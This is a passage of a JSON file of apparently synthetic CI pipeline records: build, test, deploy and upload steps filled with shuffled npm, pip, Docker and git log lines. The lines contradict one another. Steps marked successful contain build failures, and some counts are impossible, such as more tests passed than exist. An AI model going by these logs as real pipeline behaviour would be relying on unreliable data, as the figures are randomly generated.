          "yarn add: Done in 28.16s",
          "yarn add: Done in 1.13s",
          "Step 4/25: Testing",
          "[12:18:17] INFO: Request completed",
          "FAILED: test_user_create",
          "pip: Installing build dependencies...",
          "Success!",
          "Minifying main.js",
          "\u2713 Step 'install' succeeded",
          "[12:18:17] ERROR: Connection failed",
          "Uploading artifact 'coverage' (7 files)",
          "Compiling lib/utils.go...",
          "Fetching submodules...",
          "Artifact uploaded: dist.zip (37MB)",
          "Using Python 3.10",
          "pip install: Successfully installed eslint-4.10",
          "Using Node.js 20.14.3",
          "[12:18:17] ERROR: Connection failed",
          "OK",
          "  PASS: test_auth_login (349ms)",
          "Compiling utils/handler.rs...",
          "Fetching submodules...",
          "[12:18:17] DEBUG: Loading configuration",
          "=== Step setup_environment completed ==="
        ]
      },
      {
        "name": "build",
        "status": "success",
        "started_at": "2025-11-25T12:19:56.145995",
        "finished_at": "2025-11-25T12:21:00.510615",
        "log_lines": [
          "=== Step: build ===",
          "Platform: darwin-arm64",
          "[12:18:17] DEBUG: Memory usage: 875MB",
          "Ready.",
          "Artifact uploaded: build.tar.gz (20MB)",
          "Cache hit for key-8540",
          "HEAD is now at a4776fc",
          "Already up to date.",
          "Coverage: 90% statements, 74% branches",
          "pip: Installing build dependencies...",
          "Completed.",
          "Done.",
          "Compiling src/utils.go...",
          "  PASS: integration/test_user_create.spec.js",
          "\u2713 All checks passed",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "WARNING: lodash has known vulnerabilities",
          "Verifying...",
          "Test Suites: 20 passed, 48 total",
          "Compiling src/app.ts...",
          "Step 7/15: Testing",
          "npm notice: package.json updated",
          "Ready.",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Pushing to registry...",
          "Success!",
          "Building Docker image...",
          "Building Docker image...",
          "[12:18:17] ERROR: Connection failed",
          "Pulling image: node:3.11",
          "Compiling utils/app.ts...",
          "Connecting to acme.corp:443...",
          "Minifying vendor.js",
          "Artifact uploaded: dist.zip (72MB)",
          "  PASS: test_api_health (447ms)",
          "Step 10/22: Linting",
          "Pulling image: node:latest",
          "Step 20/23: Installing dependencies",
          "Step 20/22: Linting",
          "Done.",
          "Cache hit for key-3590",
          "Optimizing 55 modules...",
          "Connection established",
          "Platform: darwin-arm64",
          "Step 5/16: Installing dependencies",
          "Installing prettier@1.11.0",
          "  PASS: test_auth_login (459ms)",
          "Artifact downloaded: 36MB",
          "Exception: RuntimeError",
          "\u2713 Step 'install' succeeded",
          "pip: Installing build dependencies...",
          "Building Docker image...",
          "Time: 86.876s",
          "Compiling lib/utils.go...",
          "FAILED: test_auth_login",
          "Success!",
          "Fetching submodules...",
          "Platform: win32-x64",
          "Step 1/18: Linting",
          "[12:18:17] DEBUG: Initializing service",
          "pip: Installing build dependencies...",
          "npm install: added 496 packages",
          "Pulling image: node:3.11",
          "Building Docker image...",
          "Cache miss for key-9646",
          "FAILED: test_db_connect",
          "Step 3/23: Linting",
          "WARNING: axios has known vulnerabilities",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (9MB)",
          "Snapshots: 36 passed, 23 total",
          "Pulling image: python:3.11",
          "[12:18:17] DEBUG: Loading configuration",
          "Compiling src/main.py...",
          "Success!",
          "Checking out master branch",
          "HEAD is now at 7eeb0dd",
          "Artifact uploaded: dist.zip (67MB)",
          "OK",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Exception: RuntimeError",
          "Uploading artifact 'coverage' (48 files)",
          "Compiling components/index.js...",
          "Ready.",
          "npm install: resolved 555 packages",
          "HEAD is now at 02540a1",
          "OK",
          "pip install: Successfully installed express-1.6",
          "Cache invalidated: node_modules",
          "Artifact uploaded: build.tar.gz (46MB)",
          "Artifact uploaded: build.tar.gz (22MB)",
          "Layer 4/15: RUN command",
          "Layer 7/15: ENV command",
          "Pulling image: node:latest",
          "Creating production build...",
          "Finished.",
          "\u2717 build failed with exit code 95",
          "[12:18:17] DEBUG: Memory usage: 1185MB",
          "\u2713 package completed",
          "Cache miss for key-1030",
          "Exception: NullPointerException",
          "WARNING: webpack has known vulnerabilities",
          "[12:18:17] INFO: Request completed",
          "  PASS: test_db_connect (111ms)",
          "Step 18/24: Installing dependencies",
          "FAILED: test_user_create",
          "pip: Downloading webpack-2.6.tar.gz",
          "Step 6/24: Installing dependencies",
          "Optimizing 54 modules...",
          "[12:18:17] INFO: Cache refreshed",
          "Artifact downloaded: 29MB",
          "Fetching submodules...",
          "Artifact downloaded: 13MB",
          "Step 4/19: Installing dependencies",
          "  PASS: integration/test_api_health.spec.js",
          "Cache hit for key-7970",
          "Checking out master branch",
          "Tests: 481 passed, 406 total",
          "pip: Installing build dependencies...",
          "[12:18:17] WARN: Deprecated API usage",
          "pip: Collecting express",
          "Uploading artifact 'dist' (20 files)",
          "Image pulled successfully",
          "Time: 119.902s",
          "pip: Downloading webpack-2.20.tar.gz",
          "[12:18:17] DEBUG: Connection pool: 4 active",
          "Artifact downloaded: 23MB",
          "Checking out master branch",
          "Ran 200 tests in 15s",
          "TLS handshake completed",
          "HEAD is now at 7656ee1",
          "Ready.",
          "Uploading artifact 'build' (18 files)",
          "npm notice: created a lockfile",
          "OK",
          "pip install: Successfully installed react-5.12",
          "Cache invalidated: dependencies",
          "  PASS: unit/test_api_health.spec.js",
          "Connecting to test.io:443...",
          "Step 9/20: Linting",
          "Creating production build...",
          "Building Docker image...",
          "npm install: added 244 packages",
          "pip: Downloading eslint-1.14.tar.gz",
          "Cache invalidated: dependencies",
          "Verifying...",
          "Step 18/20: Testing",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "\u2713 Step 'test' succeeded",
          "HEAD is now at 6f1cb1b",
          "Using Node.js 17.2.9",
          "Pushing to registry...",
          "Cache invalidated: dependencies",
          "Step 2/16: Linting",
          "Environment: staging",
          "Ready.",
          "Compiling src/service.java...",
          "Switched to branch 'feature/task-374'",
          "Completed.",
          "Layer 5/14: RUN command",
          "Success!",
          "\u2713 All checks passed",
          "Connecting to acme.corp:443...",
          "Compiling src/utils.go...",
          "[12:18:17] INFO: Cache refreshed",
          "[12:18:17] DEBUG: Loading configuration",
          "Finished.",
          "Image pulled successfully",
          "Step 12/16: Deploying",
          "Bundling runtime.css",
          "pip install: Successfully installed eslint-1.18",
          "Test Suites: 9 passed, 45 total",
          "Cache miss for key-3414",
          "npm notice: created a lockfile",
          "yarn add: Done in 11.12s",
          "npm notice: created a lockfile",
          "Checking out main branch",
          "Cache miss for key-9373",
          "Connection established",
          "[12:18:17] WARN: Deprecated API usage",
          "Completed.",
          "Cache restored successfully (226MB)",
          "Cache invalidated: dependencies",
          "TLS handshake completed",
          "Fetching submodules...",
          "Pulling image: alpine:latest",
          "GET /api - 201 (96ms)",
          "pip: Collecting react",
          "Pulling image: alpine:latest",
          "Cache saved successfully",
          "npm install: resolved 376 packages",
          "npm install: added 465 packages",
          "[12:18:17] INFO: Request completed",
          "[12:18:17] INFO: Connecting to database",
          "Transforming 235 files...",
          "[12:18:17] INFO: Connecting to database",
          "Processing...",
          "Ran 67 tests in 38s",
          "Ready.",
          "=== Step build completed ==="
        ]
      },
      {
        "name": "integration_tests",
        "status": "success",
        "started_at": "2025-11-25T12:21:00.510615",
        "finished_at": "2025-11-25T12:21:43.420362",
        "log_lines": [
          "=== Step: integration_tests ===",
          "[12:18:17] INFO: Starting build process",
          "OK",
          "Step 15/21: Installing dependencies",
          "Optimizing 54 modules...",
          "TLS handshake completed",
          "[12:18:17] DEBUG: Connection pool: 7 active",
          "[12:18:17] DEBUG: Connection pool: 2 active",
          "Compiling utils/utils.go...",
          "Compiling components/utils.go...",
          "Ran 195 tests in 32s",
          "Step 12/21: Testing",
          "Optimizing 94 modules...",
          "  PASS: unit/test_auth_login.spec.js",
          "Minifying vendor.js",
          "Image pulled successfully",
          "[12:18:17] INFO: Cache refreshed",
          "Checking out master branch",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "pip: Downloading eslint-5.18.tar.gz",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Completed.",
          "HEAD is now at a1b730f",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Transforming 827 files...",
          "[12:18:17] ERROR: Connection failed",
          "TLS handshake completed",
          "npm install: added 112 packages",
          "Verifying...",
          "[12:18:17] INFO: Request completed",
          "Step 11/20: Installing dependencies",
          "[12:18:17] DEBUG: Query executed in 46ms",
          "\u2713 Step 'checkout' succeeded",
          "[12:18:17] INFO: Request completed",
          "NODE_ENV=test",
          "[12:18:17] WARN: Deprecated API usage",
          "Using Node.js 18.18.5",
          "Building Docker image...",
          "Test Suites: 43 passed, 45 total",
          "Connecting to acme.corp:443...",
          "Step 7/23: Building",
          "[12:18:17] DEBUG: Loading configuration",
          "Cache restored successfully (439MB)",
          "Fetching submodules...",
          "Step 4/18: Linting",
          "npm notice: package.json updated",
          "Compiling components/utils.go...",
          "Compiling lib/index.js...",
          "Cache miss for key-4975",
          "  PASS: e2e/test_user_create.spec.js",
          "Installing express@2.9.1",
          "TLS handshake completed",
          "Success!",
          "Transforming 610 files...",
          "pip: Installing build dependencies...",
          "Test Suites: 43 passed, 45 total",
          "Switched to branch 'feature/task-950'",
          "Compiling lib/service.java...",
          "Step 2/23: Deploying",
          "npm install: added 375 packages",
          "Checking out master branch",
          "Step 10/17: Running migrations",
          "\u2713 Task completed in 3184ms",
          "Waiting...",
          "Platform: win32-x64",
          "Already up to date.",
          "[12:18:17] DEBUG: Query executed in 79ms",
          "Cache invalidated: dependencies",
          "Ready.",
          "Compiling lib/utils.go...",
          "[12:18:17] WARN: Deprecated API usage",
          "Exception: NullPointerException",
          "Switched to branch 'bugfix/task-362'",
          "[12:18:17] INFO: Connecting to database",
          "Step 1/23: Linting",
          "Bundling runtime.js",
          "  PASS: test_cache_hit (183ms)",
          "Success!",
          "  PASS: integration/test_user_create.spec.js",
          "yarn add: Done in 18.77s",
          "  PASS: test_user_create (273ms)",
          "Step 9/21: Running migrations",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] DEBUG: Connection pool: 8 active",
          "Cache saved successfully",
          "Generating source maps...",
          "npm install: resolved 1765 packages",
          "Already up to date.",
          "OK",
          "Artifact downloaded: 18MB",
          "Processing...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Waiting...",
          "Step 15/17: Testing",
          "Connection established",
          "Pushing to registry...",
          "Cache saved successfully",
          "\u2713 Step 'test' succeeded",
          "Snapshots: 46 passed, 42 total",
          "\u2713 lint completed",
          "Step 14/15: Running migrations",
          "Cache miss for key-4904",
          "\u2717 build failed with exit code 50",
          "Using Python 3.9",
          "Coverage: 87% statements, 83% branches",
          "Coverage: 90% statements, 73% branches",
          "Optimizing 18 modules...",
          "  PASS: test_user_create (115ms)",
          "Transforming 794 files...",
          "Artifact downloaded: 37MB",
          "Compiling lib/index.js...",
          "[12:18:17] DEBUG: Loading configuration",
          "[12:18:17] DEBUG: Initializing service",
          "Finished.",
          "Cache restored successfully (135MB)",
          "\u2717 build failed with exit code 12",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2713 Step 'install' succeeded",
          "Cache saved successfully",
          "[12:18:17] INFO: Cache refreshed",
          "Step 9/25: Running migrations",
          "Optimizing 84 modules...",
          "Bundling vendor.js",
          "Using Python 3.12",
          "[12:18:17] DEBUG: Query executed in 55ms",
          "npm notice: created a lockfile",
          "[12:18:17] INFO: Connecting to database",
          "Cache saved successfully",
          "Finished.",
          "Building Docker image...",
          "Environment: development",
          "npm notice: package.json updated",
          "Tests: 283 passed, 388 total",
          "Cache invalidated: build",
          "FAILED: test_user_create",
          "Waiting...",
          "Already up to date.",
          "Verifying...",
          "Pulling image: node:latest",
          "Platform: darwin-arm64",
          "Time: 33.291s",
          "Generating source maps...",
          "\u2713 Step 'build' succeeded",
          "Step 20/17: Running migrations",
          "Step 13/15: Linting",
          "Connection established",
          "Bundling styles.js",
          "Using Python 3.11",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Step 4/17: Testing",
          "Step 17/24: Running migrations",
          "[12:18:17] WARN: Deprecated API usage",
          "WARNING: lodash has known vulnerabilities",
          "Minifying vendor.js",
          "pip install: Successfully installed axios-4.19",
          "Step 8/21: Installing dependencies",
          "Cache saved successfully",
          "npm install: resolved 376 packages",
          "Coverage: 86% statements, 89% branches",
          "Pulling image: node:18",
          "Image pulled successfully",
          "Fetching submodules...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "FAILED: test_user_create",
          "Artifact downloaded: 20MB",
          "npm install: added 399 packages",
          "Transforming 346 files...",
          "Connecting to cloud.services:443...",
          "Layer 5/9: ENV command",
          "Compiling lib/app.ts...",
          "Waiting...",
          "OK",
          "Compiling lib/app.ts...",
          "Pushing to registry...",
          "Transforming 861 files...",
          "OK",
          "Compiling lib/handler.rs...",
          "[12:18:17] DEBUG: Loading configuration",
          "Done.",
          "npm notice: created a lockfile",
          "Cache restored successfully (145MB)",
          "Done.",
          "Step 20/24: Building",
          "npm notice: package.json updated",
          "\u2713 lint completed",
          "Using Node.js 15.4.6",
          "Cache saved successfully",
          "Connecting to cloud.services:443...",
          "Installing express@3.16.4",
          "pip install: Successfully installed jest-1.11",
          "Compiling components/app.ts...",
          "Compiling src/index.js...",
          "WARNING: react has known vulnerabilities",
          "Switched to branch 'hotfix/task-825'",
          "Uploading artifact 'build' (34 files)",
          "[12:18:17] WARN: Deprecated API usage",
          "yarn add: Done in 12.87s",
          "Completed.",
          "Tests: 214 passed, 194 total",
          "[12:18:17] INFO: Connecting to database",
          "[12:18:17] DEBUG: Loading configuration",
          "=== Step integration_tests completed ==="
        ]
      },
      {
        "name": "install_dependencies",
        "status": "success",
        "started_at": "2025-11-25T12:21:43.420362",
        "finished_at": "2025-11-25T12:22:47.784982",
        "log_lines": [
          "=== Step: install_dependencies ===",
          "Coverage: 78% statements, 64% branches",
          "Cache saved successfully",
          "Verifying...",
          "HEAD is now at f1457de",
          "\u2713 Step 'checkout' succeeded",
          "Pushing to registry...",
          "Uploading artifact 'coverage' (13 files)",
          "Transforming 315 files...",
          "Compiling lib/index.js...",
          "Creating production build...",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 4/17: Running migrations",
          "Processing...",
          "Time: 107.213s",
          "pip: Collecting express",
          "Bundling main.css",
          "WARNING: eslint has known vulnerabilities",
          "Compiling components/index.js...",
          "pip install: Successfully installed express-3.16",
          "[12:18:17] DEBUG: Query executed in 82ms",
          "[12:18:17] DEBUG: Connection pool: 18 active",
          "[12:18:17] WARN: Deprecated API usage",
          "Using Python 3.11",
          "Ready.",
          "WARNING: express has known vulnerabilities",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] INFO: Connecting to database",
          "Artifact downloaded: 4MB",
          "Compiling lib/utils.go...",
          "Connecting to cloud.services:443...",
          "Transforming 169 files...",
          "yarn add: Done in 10.94s",
          "Artifact uploaded: build.tar.gz (23MB)",
          "Layer 8/13: RUN command",
          "Ran 10 tests in 55s",
          "TLS handshake completed",
          "GET /api - 200 (6ms)",
          "Optimizing 85 modules...",
          "Loading...",
          "Creating production build...",
          "Connecting to test.io:443...",
          "Done.",
          "WARNING: prettier has known vulnerabilities",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Cache miss for key-6188",
          "Pulling image: python:latest",
          "Minifying vendor.js",
          "[12:18:17] ERROR: Connection failed",
          "HEAD is now at 3e243da",
          "TLS handshake completed",
          "Connecting to startup.dev:443...",
          "Snapshots: 12 passed, 47 total",
          "Minifying vendor.js",
          "HEAD is now at fcb5256",
          "Step 10/15: Running migrations",
          "Optimizing 34 modules...",
          "Ready.",
          "[12:18:17] DEBUG: Initializing service",
          "Success!",
          "Artifact uploaded: build.tar.gz (41MB)",
          "Test Suites: 24 passed, 30 total",
          "Step 17/19: Deploying",
          "[12:18:17] INFO: Processing request",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] ERROR: Connection failed",
          "Finished.",
          "Processing...",
          "Completed.",
          "[12:18:17] WARN: Deprecated API usage",
          "POST /upload - 201 (244ms)",
          "Loading...",
          "Image pulled successfully",
          "\u2713 build completed",
          "[12:18:17] DEBUG: Loading configuration",
          "Compiling lib/app.ts...",
          "Verifying...",
          "Platform: darwin-arm64",
          "[12:18:17] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Fetching submodules...",
          "\u2713 Task completed in 3767ms",
          "pip: Collecting express",
          "WARNING: jest has known vulnerabilities",
          "Step 8/24: Running migrations",
          "Cache hit for key-7606",
          "Tests: 278 passed, 102 total",
          "Cache miss for key-3084",
          "Exception: RuntimeError",
          "Connecting to startup.dev:443...",
          "\u2713 Step 'test' succeeded",
          "Cache saved successfully",
          "Connecting to test.io:443...",
          "pip install: Successfully installed axios-4.2",
          "Completed.",
          "\u2713 Task completed in 4218ms",
          "[12:18:17] DEBUG: Memory usage: 1150MB",
          "npm notice: created a lockfile",
          "Finished.",
          "TLS handshake completed",
          "Step 11/25: Linting",
          "Completed.",
          "Compiling components/service.java...",
          "Creating production build...",
          "Image pulled successfully",
          "Completed.",
          "[12:18:17] DEBUG: Loading configuration",
          "Environment: production",
          "Step 12/21: Testing",
          "Cache restored successfully (386MB)",
          "Compiling utils/main.py...",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Snapshots: 43 passed, 20 total",
          "Ran 73 tests in 31s",
          "[12:18:17] DEBUG: Connection pool: 1 active",
          "Cache miss for key-6377",
          "Generating source maps...",
          "Cache miss for key-6055",
          "\u2713 Step 'build' succeeded",
          "Cache invalidated: node_modules",
          "[12:18:17] DEBUG: Connection pool: 20 active",
          "\u2713 Step 'setup' succeeded",
          "HEAD is now at 2cca6d0",
          "npm install: resolved 159 packages",
          "[12:18:17] INFO: Request completed",
          "Success!",
          "Already up to date.",
          "Waiting...",
          "Done.",
          "Test Suites: 26 passed, 33 total",
          "Coverage: 85% statements, 92% branches",
          "  PASS: test_db_connect (351ms)",
          "Waiting...",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 7/21: Deploying",
          "[12:18:17] INFO: Request completed",
          "[12:18:17] INFO: Cache refreshed",
          "Image pulled successfully",
          "[12:18:17] DEBUG: Query executed in 86ms",
          "Creating production build...",
          "Cache invalidated: node_modules",
          "Tests: 183 passed, 83 total",
          "[12:18:17] DEBUG: Memory usage: 932MB",
          "Compiling utils/handler.rs...",
          "\u26a0 DEPRECATION: Feature will be removed in v2.0",
          "Using Node.js 18.10.10",
          "\u2713 Step 'setup' succeeded",
          "Step 19/25: Building",
          "\u2713 All checks passed",
          "Switched to branch 'feature/task-200'",
          "Cache hit for key-6347",
          "Artifact downloaded: 14MB",
          "Time: 83.614s",
          "[12:18:17] WARN: Deprecated API usage",
          "Switched to branch 'bugfix/task-709'",
          "OK",
          "Using Python 3.12",
          "Switched to branch 'feature/task-996'",
          "Pulling image: alpine:18",
          "Transforming 406 files...",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 13/24: Installing dependencies",
          "  PASS: test_user_create (406ms)",
          "Creating production build...",
          "\u2713 All checks passed",
          "Artifact uploaded: dist.zip (60MB)",
          "Snapshots: 8 passed, 30 total",
          "Generating source maps...",
          "HEAD is now at 175c8d0",
          "FAILED: test_auth_login",
          "Transforming 654 files...",
          "Connecting to cloud.services:443...",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] INFO: Starting build process",
          "Verifying...",
          "Cache miss for key-8778",
          "WARNING: eslint has known vulnerabilities",
          "Cache restored successfully (479MB)",
          "npm install: added 480 packages",
          "Using Python 3.12",
          "Building Docker image...",
          "Finished.",
          "Step 5/15: Testing",
          "Building Docker image...",
          "Cache miss for key-9947",
          "Fetching submodules...",
          "Ready.",
          "pip: Downloading prettier-2.17.tar.gz",
          "Cache miss for key-2345",
          "[12:18:17] INFO: Processing request",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "  PASS: test_auth_login (235ms)",
          "Pushing to registry...",
          "pip: Installing build dependencies...",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] DEBUG: Initializing service",
          "Compiling utils/utils.go...",
          "  PASS: test_user_create (92ms)",
          "Uploading artifact 'coverage' (15 files)",
          "Minifying app.js",
          "Waiting...",
          "Cache saved successfully",
          "=== Step install_dependencies completed ==="
        ]
      },
      {
        "name": "deploy_production",
        "status": "success",
        "started_at": "2025-11-25T12:22:47.784982",
        "finished_at": "2025-11-25T12:22:56.366931",
        "log_lines": [
          "=== Step: deploy_production ===",
          "pip: Installing build dependencies...",
          "Waiting...",
          "WARNING: prettier has known vulnerabilities",
          "Building Docker image...",
          "Compiling components/handler.rs...",
          "Installing prettier@3.13.0",
          "Test Suites: 27 passed, 41 total",
          "[12:18:17] DEBUG: Initializing service",
          "[12:18:17] DEBUG: Initializing service",
          "  PASS: test_db_connect (314ms)",
          "[12:18:17] WARN: Deprecated API usage",
          "Done.",
          "Step 11/22: Running migrations",
          "WARNING: react has known vulnerabilities",
          "[12:18:17] WARN: Deprecated API usage",
          "Completed.",
          "yarn add: Done in 12.58s",
          "Switched to branch 'feature/task-216'",
          "[12:18:17] ERROR: Connection failed",
          "Building Docker image...",
          "Compiling lib/service.java...",
          "TLS handshake completed",
          "[12:18:17] DEBUG: Connection pool: 12 active",
          "Transforming 936 files...",
          "GET /api - 201 (98ms)",
          "GET /health - 201 (17ms)",
          "\u2713 validate completed",
          "Compiling src/service.java...",
          "Switched to branch 'feature/task-391'",
          "Ran 131 tests in 49s",
          "pip install: Successfully installed jest-4.6",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:18:17] WARN: Deprecated API usage",
          "Artifact uploaded: dist.zip (20MB)",
          "npm notice: created a lockfile",
          "npm install: added 205 packages",
          "Connecting to example.com:443...",
          "Coverage: 99% statements, 80% branches",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "\u2717 build failed with exit code 45",
          "Minifying vendor.js",
          "WARNING: jest has known vulnerabilities",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] WARN: Deprecated API usage",
          "Artifact uploaded: build.tar.gz (10MB)",
          "Connecting to test.io:443...",
          "WARNING: jest has known vulnerabilities",
          "WARNING: react has known vulnerabilities",
          "Cache miss for key-7687",
          "Cache hit for key-4758",
          "Already up to date.",
          "Building Docker image...",
          "Cache restored successfully (126MB)",
          "Cache miss for key-8242",
          "Transforming 463 files...",
          "Platform: win32-x64",
          "Cache saved successfully",
          "GET /api - 200 (52ms)",
          "npm install: resolved 1366 packages",
          "Finished.",
          "pip: Collecting webpack",
          "Done.",
          "Compiling lib/main.py...",
          "Generating source maps...",
          "Time: 118.674s",
          "Coverage: 74% statements, 95% branches",
          "  PASS: e2e/test_auth_login.spec.js",
          "[12:18:17] DEBUG: Connection pool: 11 active",
          "[12:18:17] INFO: Processing request",
          "Creating production build...",
          "[12:18:17] WARN: Deprecated API usage",
          "Minifying app.js",
          "npm notice: created a lockfile",
          "Loading...",
          "Building Docker image...",
          "Step 8/22: Deploying",
          "Compiling utils/main.py...",
          "Cache invalidated: node_modules",
          "Completed.",
          "NODE_ENV=test",
          "Cache restored successfully (94MB)",
          "FAILED: test_auth_login",
          "Done.",
          "Generating source maps...",
          "Switched to branch 'hotfix/task-706'",
          "Artifact uploaded: dist.zip (36MB)",
          "Step 13/22: Installing dependencies",
          "\u2713 deploy completed",
          "Fetching submodules...",
          "FAILED: test_db_connect",
          "[12:18:17] DEBUG: Loading configuration",
          "pip: Downloading prettier-4.5.tar.gz",
          "Building Docker image...",
          "Using Node.js 18.1.9",
          "Compiling utils/app.ts...",
          "Cache saved successfully",
          "\u2713 All checks passed",
          "Switched to branch 'hotfix/task-910'",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "Step 1/19: Installing dependencies",
          "Snapshots: 38 passed, 38 total",
          "npm notice: package.json updated",
          "Verifying...",
          "Compiling components/main.py...",
          "Image pulled successfully",
          "WARNING: prettier has known vulnerabilities",
          "\u2713 All checks passed",
          "Step 14/19: Testing",
          "Bundling main.css",
          "\u2717 build failed with exit code 127",
          "  PASS: unit/test_cache_hit.spec.js",
          "Fetching submodules...",
          "Minifying main.js",
          "HEAD is now at efee0eb",
          "[12:18:17] WARN: Deprecated API usage",
          "[12:18:17] ERROR: Connection failed",
          "Transforming 485 files...",
          "Success!",
          "Using Python 3.10",
          "[12:18:17] INFO: Starting build process",
          "Coverage: 83% statements, 66% branches",
          "Ran 121 tests in 5s",
          "Processing...",
          "[12:18:17] INFO: Processing request",
          "pip: Downloading webpack-3.0.tar.gz",
          "Step 7/25: Running migrations",
          "Step 14/20: Building",
          "Step 2/21: Running migrations",
          "Pulling image: alpine:3.11",
          "Optimizing 83 modules...",
          "npm install: resolved 488 packages",
          "Completed.",
          "yarn add: Done in 13.21s",
          "Step 7/20: Deploying",
          "[12:18:17] INFO: Starting build process",
          "[12:18:17] WARN: Deprecated API usage",
          "Uploading artifact 'coverage' (26 files)",
          "Step 18/23: Building",
          "HEAD is now at e66edea",
          "Done.",
          "Step 10/18: Building",
          "Snapshots: 44 passed, 41 total",
          "Test Suites: 31 passed, 26 total",
          "Minifying app.js",
          "POST /api - 200 (371ms)",
          "Step 3/18: Deploying",
          "Platform: linux-x64",
          "[12:18:17] INFO: Request completed",
          "Fetching submodules...",
          "[12:18:17] DEBUG: Query executed in 39ms",
          "Waiting...",
          "Compiling src/service.java...",
          "[12:18:17] INFO: Connecting to database",
          "Optimizing 30 modules...",
          "yarn add: Done in 5.53s",
          "Already up to date.",
          "Verifying...",
          "Ran 69 tests in 8s",
          "npm install: resolved 1735 packages",
          "Checking out master branch",
          "[12:18:17] ERROR: Connection failed",
          "Cache restored successfully (90MB)",
          "\u26a0 DEPRECATION: Feature will be removed in v5.0",
          "Waiting...",
          "Image pulled successfully",
          "Finished.",
          "pip: Collecting webpack",
          "Step 18/25: Running migrations",
          "pip: Installing build dependencies...",
          "\u2713 build completed",
          "yarn add: Done in 25.92s",
          "Step 9/25: Building",
          "Transforming 729 files...",
          "pip: Installing build dependencies...",
          "Artifact downloaded: 8MB",
          "Environment: production",
          "Step 9/21: Deploying",
          "[12:18:17] INFO: Request completed",
          "Done.",
          "Ran 160 tests in 5s",
          "Step 8/18: Installing dependencies",
          "Minifying main.js",
          "npm notice: created a lockfile",
          "Pushing to registry...",
          "Platform: win32-x64",
          "[12:18:17] DEBUG: Initializing service",
          "NODE_ENV=production",
          "[12:18:17] INFO: Request completed",
          "\u2713 lint completed",
          "Generating source maps...",
          "FAILED: test_auth_login",
          "Using Python 3.11",
          "Platform: darwin-arm64",
          "[12:18:17] WARN: Deprecated API usage",
          "npm notice: created a lockfile",
          "Completed.",
          "Ready.",
          "Uploading artifact 'coverage' (30 files)",
          "Using Python 3.10",
          "Processing...",
          "[12:18:17] WARN: Deprecated API usage",
          "=== Step deploy_production completed ==="
        ]
      },
      {
        "name": "upload_artifacts",
        "status": "success",
        "started_at": "2025-11-25T12:22:56.366931",
        "finished_at": "2025-11-25T12:23:17.821804",
        "log_lines": [
          "=== Step: upload_artifacts ===",
          "Verifying...",
          "Ran 21 tests in 25s",
          "Success!",
          "Compiling utils/service.java...",
          "npm install: resolved 552 packages",
          "Uploading artifact 'coverage' (9 files)",
          "Compiling src/handler.rs...",
          "Test Suites: 36 passed, 40 total",
          "Minifying main.js",
          "Cache saved successfully",
          "[12:18:17] INFO: Starting build process",
          "Cache miss for key-6074",
          "  PASS: unit/test_api_health.spec.js",
          "Artifact uploaded: build.tar.gz (43MB)",
          "\u2713 deploy completed",
          "Building Docker image...",
          "[12:18:17] DEBUG: Initializing service",
          "\u26a0 DEPRECATION: Feature will be removed in v4.0",
          "WARNING: eslint has known vulnerabilities",
          "Layer 8/8: COPY command",
          "Artifact uploaded: dist.zip (21MB)",
          "Environment: production",
          "npm notice: package.json updated",
          "NODE_ENV=development",
          "[12:18:17] DEBUG: Memory usage: 884MB",
          "npm notice: created a lockfile",
          "Step 6/16: Running migrations",
          "OK",
          "Layer 6/9: ENV command",
          "[12:18:17] DEBUG: Query executed in 90ms",
          "Cache miss for key-1226",
          "Coverage: 97% statements, 88% branches",
          "\u2713 Task completed in 249ms",
          "Minifying app.js",
          "Compiling utils/service.java...",
          "WARNING: express has known vulnerabilities",
          "npm install: added 55 packages",
          "yarn add: Done in 18.30s",
          "Artifact uploaded: dist.zip (54MB)",
          "TLS handshake completed",
          "Step 4/16: Building",
          "Minifying main.js",
          "[12:18:17] INFO: Processing request",
          "Optimizing 13 modules...",
          "Transforming 265 files...",
          "[12:18:17] DEBUG: Query executed in 12ms",
          "  PASS: e2e/test_cache_hit.spec.js",
          "Tests: 194 passed, 151 total",
          "Checking out main branch",
          "WARNING: prettier has known vulnerabilities",
          "TLS handshake completed",
          "pip install: Successfully installed webpack-3.3",
          "Creating production build...",
          "Ready.",
          "Finished.",
          "pip: Downloading express-4.0.tar.gz",
          "Step 5/25: Building",
          "Transforming 986 files...",
          "\u2717 build failed with exit code 83",
          "Cache miss for key-4941",
          "Verifying...",
          "Step 14/21: Building",
          "Pushing to registry...",
          "  PASS: test_user_create (9ms)",
          "Layer 10/13: ENV command",
          "[12:18:17] INFO: Cache refreshed",
          "Completed.",
          "[12:18:17] WARN: Deprecated API usage",
          "Step 13/21: Testing",
          "HEAD is now at 35587e8",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "yarn add: Done in 10.4s",
          "Image pulled successfully",
          "FAILED: test_db_connect",
          "\u26a0 DEPRECATION: Feature will be removed in v3.0",
          "Pulling image: python:latest",
          "Step 9/19: Installing dependencies",
